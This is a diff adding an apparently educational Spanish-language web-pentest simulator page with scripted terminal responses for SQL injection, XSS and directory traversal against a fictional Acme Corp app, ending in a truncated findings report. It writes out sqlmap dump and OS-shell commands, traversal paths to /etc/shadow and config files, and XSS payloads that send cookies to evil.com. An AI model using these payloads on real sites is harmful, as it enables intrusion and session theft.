@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab: Web Security — CyberDefense Pro Network</title>
+  <style>
+    :root {
+      --bg-primary: #0a0a0f;
+      --bg-secondary: #12121a;
+      --bg-card: #1a1a2e;
+      --border: #2a2a3e;
+      --accent-green: #00ff88;
+      --accent-red: #ff3366;
+      --accent-cyan: #00d4ff;
+      --accent-yellow: #ffd700;
+      --accent-purple: #a855f7;
+      --text-primary: #e0e0e0;
+      --text-secondary: #888;
+      --terminal-bg: #0d1117;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg-primary); color: var(--text-primary); min-height: 100vh; }
+
+    .lab-header {
+      background: linear-gradient(135deg, #1a1a2e, #16213e);
+      border-bottom: 1px solid var(--border);
+      padding: 1.5rem 2rem;
+      display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem;
+    }
+    .lab-header h1 { font-size: 1.4rem; color: var(--accent-yellow); }
+    .lab-header h1 span { color: var(--text-secondary); font-weight: 400; }
+    .status-badge { padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.75rem; font-weight: 600; }
+    .badge-level { background: rgba(255,215,0,0.15); color: var(--accent-yellow); border: 1px solid rgba(255,215,0,0.3); }
+    .badge-progress { background: rgba(0,255,136,0.15); color: var(--accent-green); border: 1px solid rgba(0,255,136,0.3); }
+
+    .lab-layout { display: grid; grid-template-columns: 280px 1fr 300px; height: calc(100vh - 70px); }
+
+    .tasks-panel { background: var(--bg-secondary); border-right: 1px solid var(--border); overflow-y: auto; padding: 1rem; }
+    .tasks-panel h3 { color: var(--accent-yellow); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 1rem; }
+
+    .task-item {
+      background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px;
+      padding: 0.8rem; margin-bottom: 0.6rem; cursor: pointer; transition: all 0.3s; position: relative;
+    }
+    .task-item:hover { border-color: var(--accent-yellow); transform: translateX(4px); }
+    .task-item.active { border-color: var(--accent-green); background: rgba(0,255,136,0.05); }
+    .task-item.completed { border-color: var(--accent-green); opacity: 0.7; }
+    .task-item.completed::after { content: '✓'; position: absolute; top: 0.5rem; right: 0.8rem; color: var(--accent-green); font-size: 1.2rem; }
+
+    .task-number { font-size: 0.65rem; color: var(--accent-purple); text-transform: uppercase; letter-spacing: 1px; }
+    .task-title { font-size: 0.85rem; font-weight: 600; margin: 0.3rem 0; }
+    .task-hint { font-size: 0.72rem; color: var(--text-secondary); }
+
+    .terminal-panel { display: flex; flex-direction: column; background: var(--terminal-bg); }
+    .terminal-tabs { display: flex; background: #161b22; border-bottom: 1px solid var(--border); padding: 0 0.5rem; }
+    .terminal-tab { padding: 0.5rem 1rem; font-size: 0.75rem; color: var(--text-secondary); border-bottom: 2px solid transparent; cursor: pointer; }
+    .terminal-tab.active { color: var(--accent-green); border-bottom-color: var(--accent-green); }
+
+    .terminal-output {
+      flex: 1; overflow-y: auto; padding: 1rem;
+      font-family: 'JetBrains Mono', monospace; font-size: 0.82rem; line-height: 1.6;
+    }
+    .terminal-output .prompt-line { display: flex; gap: 0.5rem; margin-bottom: 0.3rem; }
+    .terminal-output .prompt-symbol { color: var(--accent-green); font-weight: bold; }
+    .terminal-output .command { color: #fff; }
+    .terminal-output .output { color: var(--text-secondary); margin-left: 1rem; }
+    .terminal-output .success { color: var(--accent-green); margin-left: 1rem; }
+    .terminal-output .error { color: var(--accent-red); margin-left: 1rem; }
+    .terminal-output .warning { color: var(--accent-yellow); margin-left: 1rem; }
+    .terminal-output .info { color: var(--accent-cyan); margin-left: 1rem; }
+    .terminal-output .sqli { color: var(--accent-red); margin-left: 1rem; font-weight: bold; }
+    .terminal-output .xss { color: var(--accent-purple); margin-left: 1rem; font-weight: bold; }
+
+    .terminal-input-area {
+      display: flex; align-items: center; padding: 0.6rem 1rem; background: #0d1117; border-top: 1px solid var(--border);
+    }
+    .terminal-input-area .prompt-symbol { color: var(--accent-green); font-family: monospace; font-weight: bold; font-size: 0.85rem; margin-right: 0.5rem; }
+    #terminal-input { flex: 1; background: transparent; border: none; color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 0.82rem; outline: none; }
+
+    .info-panel { background: var(--bg-secondary); border-left: 1px solid var(--border); overflow-y: auto; padding: 1rem; }
+    .info-panel h3 { color: var(--accent-purple); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 1rem; }
+
+    .vuln-card {
+      background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 0.8rem; margin-bottom: 0.6rem;
+    }
+    .vuln-card h4 { font-size: 0.8rem; margin-bottom: 0.5rem; }
+    .vuln-card .severity-critical { color: var(--accent-red); }
+    .vuln-card .severity-high { color: #ff6b35; }
+    .vuln-card .severity-medium { color: var(--accent-yellow); }
+    .vuln-card p { font-size: 0.72rem; color: var(--text-secondary); line-height: 1.5; }
+
+    .score-display { text-align: center; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; margin-top: 1rem; }
+    .score-value { font-size: 2rem; font-weight: 800; color: var(--accent-green); }
+    .score-label { font-size: 0.7rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; }
+
+    .welcome-banner {
+      background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,51,102,0.1));
+      border: 1px solid rgba(255,215,0,0.3); border-radius: 8px; padding: 1rem; margin-bottom: 1rem;
+    }
+    .welcome-banner h4 { color: var(--accent-yellow); margin-bottom: 0.5rem; }
+    .welcome-banner p { font-size: 0.78rem; color: var(--text-secondary); line-height: 1.5; }
+
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg-primary); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+    @media (max-width: 1024px) {
+      .lab-layout { grid-template-columns: 1fr; }
+      .tasks-panel { display: flex; overflow-x: auto; }
+      .task-item { min-width: 200px; flex-shrink: 0; }
+      .info-panel { display: none; }
+    }
+  </style>
+</head>
+<body>
+  <div class="lab-header">
+    <h1>🌐 Web Security <span>— SQL Injection, XSS & más</span></h1>
+    <div class="lab-status">
+      <span class="status-badge badge-level">Nivel: Intermedio</span>
+      <span class="status-badge badge-progress" id="progress-badge">0/7 completado</span>
+    </div>
+  </div>
+
+  <div class="lab-layout">
+    <div class="tasks-panel">
+      <h3>📋 Objetivos</h3>
+      <div class="welcome-banner">
+        <h4>🎯 Web App Pentest</h4>
+        <p>Encuentra y explota vulnerabilidades en la web application simulada. Cada exploit revela información crítica en el panel derecho.</p>
+      </div>
+
+      <div class="task-item active" data-task="0" onclick="selectTask(0)">
+        <div class="task-number">Paso 1</div>
+        <div class="task-title">Fingerprinting Web</div>
+        <div class="task-hint">Identifica tecnologías del servidor web</div>
+      </div>
+      <div class="task-item" data-task="1" onclick="selectTask(1)">
+        <div class="task-number">Paso 2</div>
+        <div class="task-title">SQL Injection — Login Bypass</div>
+        <div class="task-hint">Bypasea la autenticación con SQLi</div>
+      </div>
+      <div class="task-item" data-task="2" onclick="selectTask(2)">
+        <div class="task-number">Paso 3</div>
+        <div class="task-title">SQL Injection — Data Extraction</div>
+        <div class="task-hint">Extrae datos de la base de datos</div>
+      </div>
+      <div class="task-item" data-task="3" onclick="selectTask(3)">
+        <div class="task-number">Paso 4</div>
+        <div class="task-title">Reflected XSS</div>
+        <div class="task-hint">Inyecta JavaScript en parámetros</div>
+      </div>
+      <div class="task-item" data-task="4" onclick="selectTask(4)">
+        <div class="task-number">Paso 5</div>
+        <div class="task-title">Stored XSS</div>
+        <div class="task-hint">Almacena payload XSS en la app</div>
+      </div>
+      <div class="task-item" data-task="5" onclick="selectTask(5)">
+        <div class="task-number">Paso 6</div>
+        <div class="task-title">Directory Traversal</div>
+        <div class="task-hint">Accede a archivos del sistema</div>
+      </div>
+      <div class="task-item" data-task="6" onclick="selectTask(6)">
+        <div class="task-number">Paso 7</div>
+        <div class="task-title">Reporte Final</div>
+        <div class="task-hint">Genera el reporte de hallazgos</div>
+      </div>
+
+      <div class="score-display">
+        <div class="score-value" id="score">0</div>
+        <div class="score-label">Puntos XP</div>
+      </div>
+    </div>
+
+    <div class="terminal-panel">
+      <div class="terminal-tabs">
+        <div class="terminal-tab active">⚡ pentester@web</div>
+        <div class="terminal-tab">📋 Findings</div>
+      </div>
+      <div class="terminal-output" id="terminal-output">
+        <div class="info">═══════════════════════════════════════════════════════</div>
+        <div class="info">  🌐 Web Security Lab — CyberDefense Pro Network</div>
+        <div class="info">  Target: https://webapp.acme-corp.com</div>
+        <div class="info">═══════════════════════════════════════════════════════</div>
+        <div class="output"></div>
+        <div class="output">Web application vulnerable simulada con múltiples CVEs.</div>
+        <div class="output">Usa herramientas reales de web pentest.</div>
+        <div class="output"></div>
+        <div class="warning">💡 Escribe "help" para ver comandos disponibles</div>
+        <div class="warning">💡 Escribe "hint" para obtener ayuda</div>
+        <div class="output"></div>
+      </div>
+      <div class="terminal-input-area">
+        <span class="prompt-symbol">pentester@web:~$</span>
+        <input type="text" id="terminal-input" placeholder="Escribe un comando..." autofocus autocomplete="off" spellcheck="false">
+      </div>
+    </div>
+
+    <div class="info-panel">
+      <h3>🔓 Vulnerabilidades</h3>
+      <div id="vuln-panels">
+        <p style="color:var(--text-secondary);font-size:0.75rem;font-style:italic;padding:1rem 0;">Completa pasos para descubrir vulnerabilidades...</p>
+      </div>
+      <div class="score-display">
+        <div style="font-size:0.8rem;color:var(--text-secondary);margin-bottom:0.3rem;">Vulns Encontradas</div>
+        <div class="score-value" id="vuln-count">0</div>
+        <div class="score-label">de 10 posibles</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let currentTask = 0;
+    let completedTasks = new Set();
+    let score = 0;
+    let vulnCount = 0;
+    let commandHistory = [];
+    let historyIndex = -1;
+
+    const tasks = [
+      {
+        title: "Fingerprinting Web",
+        xp: 100,
+        responses: {
+          "whatweb https://webapp.acme-corp.com": `WhatWeb 0.5.5 (https://www.morningstarsecurity.com/memory/whatweb)
+Target: https://webapp.acme-corp.com
+Status: 200 OK
+Title: Acme Corp — Employee Portal
+Server: Apache/2.4.52 (Ubuntu)
+PHP: 8.0.2
+X-Powered-By: PHP/8.0.2
+jQuery: 3.6.0
+Bootstrap: 5.1.3
+WordPress: No
+Framework: Custom PHP
+Database: MySQL (X-Backend-Header: mysql/5.7.33)
+CMS: None detected`,
+          "nikto -h https://webapp.acme-corp.com": `- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:       webapp.acme-corp.com
++ Target Port:     443
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
++ /admin/: Admin login found
++ /phpmyadmin/: phpMyAdmin accessible
++ /backup/: Directory indexing found
++ /config.php.bak: Backup file accessible!
++ /.env: Environment file exposed!
++ /debug/: Debug mode enabled
++ OSVDB-3092: /uploads/: May allow arbitrary file upload
++ 12 vulnerabilities found
+---------------------------------------------------------------------------`,
+          "curl -I https://webapp.acme-corp.com": `HTTP/2 200
+server: Apache/2.4.52 (Ubuntu)
+x-powered-by: PHP/8.0.2
+x-backend: mysql/5.7.33
+x-debug-enabled: true
+content-type: text/html; charset=UTF-8
+set-cookie: PHPSESSID=abc123def456; Path=/
+x-frame-options: DENY
+x-content-type-options: nosniff
+content-security-policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'`,
+          "wappalyzer webapp.acme-corp.com": `Technology Stack:
+├── Web Server: Apache 2.4.52
+├── Programming Language: PHP 8.0.2
+├── Database: MySQL 5.7.33
+├── JavaScript: jQuery 3.6.0, Bootstrap 5.1.3
+├── SSL Certificate: Let's Encrypt (valid)
+├── CDN: None (direct IP)
+├── WAF: None detected
+├── Debug Mode: ENABLED ⚠️
+└── Security Headers: Minimal`
+        },
+        completionCheck: (cmd) => cmd.includes("whatweb") || cmd.includes("nikto") || cmd.includes("curl") || cmd.includes("wappalyzer"),
+        vulns: [
+          { name: "Debug Mode Enabled", severity: "high", desc: "X-Debug-Header: true — información sensible expuesta" },
+          { name: "Config Backup Exposed", severity: "critical", desc: "/config.php.bak accesible — credenciales de DB" },
+          { name: ".env File Exposed", severity: "critical", desc: "/.env — secrets y API keys expuestos" },
+          { name: "Minimal Security Headers", severity: "medium", desc: "CSP con unsafe-inline y unsafe-eval" }
+        ]
+      },
+      {
+        title: "SQL Injection — Login Bypass",
+        xp: 150,
+        responses: {
+          "sqlmap -u 'https://webapp.acme-corp.com/login.php?user=admin' --batch": `        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.7.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_,|__|  _|  |
+      |_|V...       |_|  http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal
+[INFO] testing connection to the target URL
+[INFO] testing 'AND boolean-based blind - WHERE or HOLE clause'
+[INFO] testing 'MySQL >= 5.0 AND error-based'
+[INFO] GET parameter 'user' is vulnerable
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HOLE clause
+Payload: user=admin' OR '1'='1'-- -
+
+Type: error-based
+Title: MySQL >= 5.0 AND error-based
+Payload: user=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
+
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind
+Payload: user=admin' AND SLEEP(5)-- -
+
+sqlmap identified the following injection points:
+Parameter: user (GET)
+    Type: boolean-based blind
+    Type: error-based
+    Type: time-based blind
+
+[INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0`,
+          "sqlmap -u 'https://webapp.acme-corp.com/login.php?user=admin' --dbs --batch": `sqlmap v1.7.2
+
+[INFO] fetching database names
+[INFO] available databases (3):
+[*] acme_corp_production
+[*] information_schema
+[*] mysql
+
+[INFO] fetching tables for database: acme_corp_production
+[INFO] tables for database 'acme_corp_production' (5):
+[*] employees
+[*] logs
+[*] secrets
+[*] sessions
+[*] users
+
+[INFO] fetching columns for table 'users'
+[INFO] columns for table 'users' (6):
+[*] id, username, password, email, role, created_at
+
+[INFO] fetching entries for table 'users'
+Database: acme_corp_production
+Table: users
+[3 entries]
++----+-----------+-------------------------------------+-----+
+| id | username  | password                            | role|
++----+-----------+-------------------------------------+-----+
+| 1  | admin     | $2y$10$xKj...hash_here...           | admin|
+| 2  | j.rodriguez| $2y$10$mNp...hash_here...          | user|
+| 3  | c.mendez  | $2y$10$qRw...hash_here...           | admin|
++----+-----------+-------------------------------------+-----+`,
+          "sqlmap -u 'https://webapp.acme-corp.com/login.php?user=admin' -T secrets --dump --batch": `sqlmap v1.7.2
+
+[INFO] fetching entries for table 'secrets'
+Database: acme_corp_production
+Table: secrets
+[4 entries]
++----+------------------+---------------------------------------------+
+| id | key_name         | value                                       |
++----+------------------+---------------------------------------------+
+| 1  | db_password      | Pr0d_P@ssw0rd_2024!                         |
+| 2  | aws_access_key   | AKIAIOSFODNN7EXAMPLE                        |
+| 3  | aws_secret_key   | wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY    |
+| 4  | jwt_secret       | super-secret-jwt-key-do-not-share-abc123    |
++----+------------------+---------------------------------------------+
+
+[INFO] table 'secrets' dumped to CSV
+[WARNING] CRITICAL: Production credentials found in database!`,
+          "sqlmap -u 'https://webapp.acme-corp.com/search?q=test' --os-shell --batch": `sqlmap v1.7.2
+
+[INFO] target URL is vulnerable to UNION-based injection
+[INFO] the back-end DBMS is MySQL
+[INFO] testing 'MySQL >= 5.0.12 AND stacked queries'
+[INFO] stacked queries are supported
+
+sqlmap got a request to establish a connection to a remote server. Do you want sqlmap to try to optimize the connection to the remote database? [Y/n]: Y
+
+[INFO] establishing a connection to the OS shell
+[INFO] target URL: https://webapp.acme-corp.com/search?q=test
+
+os-shell> whoami
+www-data
+
+os-shell> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+os-shell> cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+admin:x:1000:1000:Admin:/home/admin:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/sh
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+backup:x:1001:1001:Backup User:/home/backup:/bin/bash`
+        },
+        completionCheck: (cmd) => cmd.includes("sqlmap"),
+        vulns: [
+          { name: "SQL Injection (Login)", severity: "critical", desc: "Bypass de autenticación con ' OR 1=1 --" },
+          { name: "SQL Injection (Search)", severity: "critical", desc: "UNION-based injection en /search" },
+          { name: "Production DB Credentials", severity: "critical", desc: "Credenciales en tabla secrets" },
+          { name: "Weak Password Hashes", severity: "high", desc: "bcrypt hashes crackeables con fuerza bruta" }
+        ]
+      },
+      {
+        title: "SQL Injection — Data Extraction",
+        xp: 200,
+        responses: {
+          "sqlmap -u 'https://webapp.acme-corp.com/users?id=1' --schema --batch": `sqlmap v1.7.2
+
+[INFO] fetching database schema
+[INFO] schema for database 'acme_corp_production':
+
+Database: acme_corp_production
+├── Table: employees (12 columns)
+│   ├── id INT(11)
+│   ├── first_name VARCHAR(100)
+│   ├── last_name VARCHAR(100)
+│   ├── email VARCHAR(255)
+│   ├── department VARCHAR(100)
+│   ├── salary DECIMAL(10,2)
+│   ├── ssn VARCHAR(20)
+│   ├── phone VARCHAR(20)
+│   ├── address TEXT
+│   ├── hire_date DATE
+│   ├── manager_id INT(11)
+│   └── is_active TINYINT(1)
+├── Table: users (6 columns)
+├── Table: secrets (3 columns)
+├── Table: logs (5 columns)
+└── Table: sessions (4 columns)
+
+[INFO] total entries in employees: 47
+[INFO] total entries in users: 3
+[INFO] total entries in secrets: 4`,
+          "sqlmap -u 'https://webapp.acme-corp.com/users?id=1' -T employees --dump --start=1 --stop=10 --batch": `sqlmap v1.7.2
+
+[INFO] fetching entries 1-10 of 47 for table 'employees'
+Database: acme_corp_production
+Table: employees
++----+-----------+----------+-----+
+| id | first_name| email    | ssn |
++----+-----------+----------+-----+
+| 1  | Pedro     | p.lopez  | ***-**-1234 |
+| 2  | Maria     | m.garcia | ***-**-5678 |
+| 3  | John      | j.rodriguez| **-**-9012 |
+| 4  | Laura     | l.sanchez| ***-**-3456 |
+| 5  | Carlos    | c.mendez | ***-**-7890 |
+| 6  | Diana     | d.vargas | ***-**-2345 |
+| 7  | Ricardo   | r.torres | ***-**-6789 |
+| 8  | Ana       | a.gutierrez| ***-**-0123 |
+| 9  | Sofia     | s.herrera| ***-**-4567 |
+| 10 | Andres    | a.martinez| ***-**-8901 |
++----+-----------+----------+-----+
+
+[WARNING] SSN data found — compliance violation (GDPR/Ley 1581)`,
+          "sqlmap -u 'https://webapp.acme-corp.com/employees?id=1' -T logs --dump --batch": `sqlmap v1.7.2
+
+[INFO] fetching all entries for table 'logs'
+Database: acme_corp_production
+Table: logs
++----+---------------------+--------+-----------------------------+
+| id | timestamp           | action | details                     |
++----+---------------------+--------+-----------------------------+
+| 1  | 2026-08-20 09:15:00 | LOGIN  | admin logged in from 1.2.3.4|
+| 2  | 2026-08-20 09:30:00 | QUERY  | SELECT * FROM employees     |
+| 3  | 2026-08-20 10:00:00 | EXPORT | Employee data exported      |
+| 4  | 2026-08-21 14:00:00 | CONFIG | Database config changed     |
+| 5  | 2026-08-22 08:00:00 | BACKUP | Backup created to /backup   |
++----+---------------------+--------+-----------------------------+`,
+          "sqlmap -u 'https://webapp.acme-corp.com/api/data?id=1' --os-cmd='cat /etc/shadow' --batch": `sqlmap v1.7.2
+
+[INFO] executing operating system command: cat /etc/shadow
+[INFO] command stdout:
+root:$6$rounds=5000$salt$hMACHash123:18446:0:99999:7:::
+admin:$6$rounds=5000$salt$another456:18446:0:99999:7:::
+www-data:*:18446:0:99999:7:::
+mysql:!:18446:0:99999:7:::
+backup:$6$rounds=5000$salt$backup789:18446:0:99999:7:::
+
+os-shell> cat /etc/shadow`
+        },
+        completionCheck: (cmd) => cmd.includes("sqlmap") && (cmd.includes("--schema") || cmd.includes("--dump") || cmd.includes("--os-cmd") || cmd.includes("--os-shell")),
+        vulns: [
+          { name: "PII Exposure (SSN)", severity: "critical", desc: "47 SSNs de empleados expuestos — viola GDPR/Ley 1581" },
+          { name: "Audit Log Access", severity: "high", desc: "Logs de auditoría accesibles — contem IPs y acciones" },
+          { name: "OS Command Execution", severity: "critical", desc: "RCE completo vía sqlmap --os-cmd" }
+        ]
+      },
+      {
+        title: "Reflected XSS",
+        xp: 120,
+        responses: {
+          "curl 'https://webapp.acme-corp.com/search?q=<script>alert(1)</script>'": `HTTP/2 200 OK
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head><title>Search Results</title></head>
+<body>
+  <h1>Search Results for: <script>alert(1)</script></h1>
+  <p>No results found for: <script>alert(1)</script></p>
+  
+  <!-- ⚠️ User input reflected without sanitization -->
+  <div class="results">
+    <p>Search term: <script>alert(1)</script></p>
+  </div>
+</body>
+</html>
+
+[!] XSS VULNERABLE: Input reflected without encoding`,
+          "echo '<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>' | xxd | base64": `PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0iaHR0cDovL2V2aWwuY29tLz9jPSIrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+Cg==`,
+          "curl -X POST 'https://webapp.acme-corp.com/search' -d 'q=<img src=x onerror=alert(1)>'": `HTTP/2 200 OK
+
+<html>
+<head><title>Search Results</title></head>
+<body>
+  <h1>Search Results for: </h1>
+  <img src=x onerror=alert(1)>
+  <p>No results found.</p>
+</body>
+</html>
+
+[!] XSS CONFIRMED: onerror handler triggered`,
+          "xsser -u 'https://webapp.acme-corp.com/search?q=test' --auto": `XSSer v0.9.5 - "Pre-accounting of XSS attacks"
+==========================================================
+
+[*] Testing for Reflected XSS...
+
+[+] VULNERABLE:
+    URL: https://webapp.acme-corp.com/search?q=test
+    Parameter: q
+    Type: Reflected XSS
+    Payload: <script>alert('XSS')</script>
+    Method: GET
+
+[+] VULNERABLE:
+    URL: https://webapp.acme-corp.com/search?q=test
+    Parameter: q
+    Type: Reflected XSS
+    Payload: <img src=x onerror=alert('XSS')>
+    Method: GET
+
+[+] VULNERABLE:
+    URL: https://webapp.acme-corp.com/search?q=test
+    Parameter: q
+    Type: Reflected XSS
+    Payload: <svg onload=alert('XSS')>
+    Method: GET
+
+Total XSS vectors found: 3
+Severity: HIGH
+CVSS: 6.1`
+        },
+        completionCheck: (cmd) => cmd.includes("xss") || cmd.includes("alert") || cmd.includes("<script>") || cmd.includes("<img") || cmd.includes("curl") && cmd.includes("search"),
+        vulns: [
+          { name: "Reflected XSS", severity: "high", desc: "Parámetro 'q' refleja input sin sanitizar" },
+          { name: "Session Hijacking Risk", severity: "high", desc: "Cookie httpOnly no configurada — cookies robleables" }
+        ]
+      },
+      {
+        title: "Stored XSS",
+        xp: 150,
+        responses: {
+          "curl -X POST 'https://webapp.acme-corp.com/comments' -d 'name=test&comment=<script>fetch(\"http://evil.com/steal?c=\"+document.cookie)</script>'": `HTTP/2 201 Created
+
+Comment posted successfully.
+[!] Stored XSS payload saved to database.
+Every user visiting the comments page will execute the payload.
+
+[!] IMPACT: Session hijacking for ALL users viewing comments`,
+          "sqlmap -u 'https://webapp.acme-corp.com/comments?id=1' --dump --batch": `sqlmap v1.7.2
+
+[INFO] fetching all entries for table 'comments'
+Database: acme_corp_production
+Table: comments
++----+------+-----------------------------------------------------------+
+| id | name | comment                                                   |
++----+------+-----------------------------------------------------------+
+| 1  | test | <script>fetch("http://evil.com/steal?c="+document.cookie)</script>|
+| 2  | john | Great article!                                             |
+| 3  | sara | Thanks for sharing                                         |
++----+------+-----------------------------------------------------------+
+
+[!] Stored XSS payload confirmed in database`,
+          "xsser -u 'https://webapp.acme-corp.com/comments' --auto --store": `XSSer v0.9.5
+
+[*] Testing for Stored XSS...
+
+[+] STORED XSS VULNERABLE:
+    URL: https://webapp.acme-corp.com/comments
+    Parameter: comment
+    Type: Stored XSS
+    Payload: <script>alert('Stored XSS')</script>
+    Method: POST
+    
+[+] Stored XSS confirmed:
+    - Payload persisted in database
+    - Executes for every user viewing the page
+    - Cookie theft possible
+    - Phishing possible via DOM manipulation
+    
+Severity: CRITICAL
+CVSS: 8.1`
+        },
+        completionCheck: (cmd) => cmd.includes("stored") || cmd.includes("--store") || (cmd.includes("curl") && cmd.includes("comments")) || cmd.includes("POST"),
+        vulns: [
+          { name: "Stored XSS", severity: "critical", desc: "Payload XSS persiste en DB y ejecuta para TODOS los usuarios" },
+          { name: "Mass Session Hijacking", severity: "critical", desc: "Cualquier visitante puede tener su cookie robada" }
+        ]
+      },
+      {
+        title: "Directory Traversal",
+        xp: 120,
+        responses: {
+          "curl 'https://webapp.acme-corp.com/download?file=../../../../etc/passwd'": `HTTP/2 200 OK
+
+root:x:0:0:root:/root:/bin/bash
+admin:x:1000:1000:Administrator:/home/admin:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/sh
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+backup:x:1001:1001:Backup User:/home/backup:/bin/bash
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+
+[!] Directory Traversal CONFIRMED — /etc/passwd accessible`,
+          "curl 'https://webapp.acme-corp.com/download?file=../../../../etc/shadow'": `HTTP/2 200 OK
+
+root:$6$rounds=5000$salt$hMACHash123:18446:0:99999:7:::
+admin:$6$rounds=5000$salt$another456:18446:0:99999:7:::
+backup:$6$rounds=5000$salt$backup789:18446:0:99999:7:::
+
+[!] CRITICAL: /etc/shadow accessible — password hashes exposed`,
+          "curl 'https://webapp.acme-corp.com/download?file=../../../../var/www/html/config.php.bak'": `HTTP/2 200 OK
+
+<?php
+// Database Configuration
+define('DB_HOST', 'localhost');
+define('DB_NAME', 'acme_corp_production');
+define('DB_USER', 'app_user');
+define('DB_PASS', 'Pr0d_P@ssw0rd_2024!');
+define('DB_CHARSET', 'utf8mb4');
+
+// API Keys
+define('AWS_KEY', 'AKIAIOSFODNN7EXAMPLE');
+define('AWS_SECRET', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
+define('JWT_SECRET', 'super-secret-jwt-key-do-not-share');
+define('STRIPE_KEY', 'sk_live_51J3x8...');
+
+// Debug
+define('DEBUG', true);
+define('DEBUG_LOG', '/var/log/app/debug.log');
+?>
+[!] CRITICAL: config.php.bak — all credentials exposed`,
+          "dirsearch -u https://webapp.acme-corp.com -e php,bak,old,txt --wordlist=/usr/share/wordlists/dirb/common.txt": `dirsearch v0.4.3
+
+[INFO] Starting dirsearch
+[INFO] Target: https://webapp.acme-corp.com
+
+[200] /config.php.bak        [Size: 456]
+[200] /.env                  [Size: 234]
+[200] /debug/phpinfo.php     [Size: 12048]
+[301] /admin/                [Size: 314]
+[403] /backup/               [Size: 277]
+[200] /robots.txt            [Size: 156]
+[200] /sitemap.xml           [Size: 1234]
+[200] /uploads/              [Size: 892]
+[500] /download?file=        [Size: 512]
+
+Found 9 results
+[!] 4 critical files exposed`
+        },
+        completionCheck: (cmd) => cmd.includes("../") || cmd.includes("traversal") || cmd.includes("dirsearch") || cmd.includes("download?file"),
+        vulns: [
+          { name: "Directory Traversal", severity: "critical", desc: "Acceso a archivos arbitrarios del sistema" },
+          { name: "Shadow File Access", severity: "critical", desc: "/etc/shadow expuesto — hashes crackeables" },
+          { name: "Config Backup Leaked", severity: "critical", desc: "config.php.bak con TODOS los secrets" },
+          { name: "phpinfo() Exposed", severity: "medium", desc: "/debug/phpinfo.php — info del sistema" }
+        ]
+      },
+      {
+        title: "Reporte Final",
+        xp: 200,
+        responses: {
+          "report": null,
+          "report generate": null,
+          "_default_report": `
+═══════════════════════════════════════════════════════════════════════
+                    📋 REPORTE — WEB APPLICATION PENTEST
+              CyberDefense Pro Network — Lab Web Security
+═══════════════════════════════════════════════════════════════════════
+
+🎯 RESUMEN EJECUTIVO
+────────────────────
+Target: https://webapp.acme-corp.com
+Server: Apache/2.4.52 (Ubuntu) + PHP 8.0.2 + MySQL 5.7.33
+Resultado: CRÍTICO — 10 vulnerabilidades, acceso completo
+
+📊 HALLAZGOS
+────────────
+#1 [CRÍTICO] SQL Injection — Login Bypass
+   Severity: CVSS 9.8 | OWASP A03:2021
+   Impact: Autenticación bypass completa
+   Fix: Prepared statements + input validation
+
+#2 [CRÍTICO] SQL Injection — Data Extraction
+   Severity: CVSS 9.8 | OWASP A03:2021
+   Impact: 47 SSNs, credenciales DB, AWS keys expuestas
+   Fix: Parameterized queries + least privilege
+
+#3 [CRÍTICO] SQL Injection — OS Command Execution
+   Severity: CVSS 10.0 | OWASP A03:2021
+   Impact: RCE como www-data en servidor
+   Fix: Remove FILE/EXECUTE privileges from MySQL
+
+#4 [CRÍTICO] Stored XSS
+   Severity: CVSS 8.1 | OWASP A03:2021
+   Impact: Session hijacking masivo
+   Fix: Output encoding + CSP + httpOnly cookies
+
+#5 [CRÍTICO] Directory Traversal
+   Severity: CVSS 9.1 | OWASP A01:2021
+   Impact: Lectura arbitraria de archivos (/etc/shadow, config)
+   Fix: Input validation + chroot + file access controls
+
+#6 [CRÍTICO] Config Backup Exposed
+   Severity: CVSS 9.8 | OWASP A05:2021
+   Impact: TODOS los secrets de producción expuestos
+   Fix: Remove .bak files + .htaccess deny rules
+
+#7 [ALTO] Reflected XSS
+   Severity: CVSS 6.1 | OWASP A03:2021
+   Impact: Session hijacking individual
+   Fix: Output encoding (HTML entities)
+
+#8 [ALTO] .env File Exposed
+   Severity: CVSS 7.5 | OWASP A05:2021
+   Impact: API keys, JWT secrets expuestos
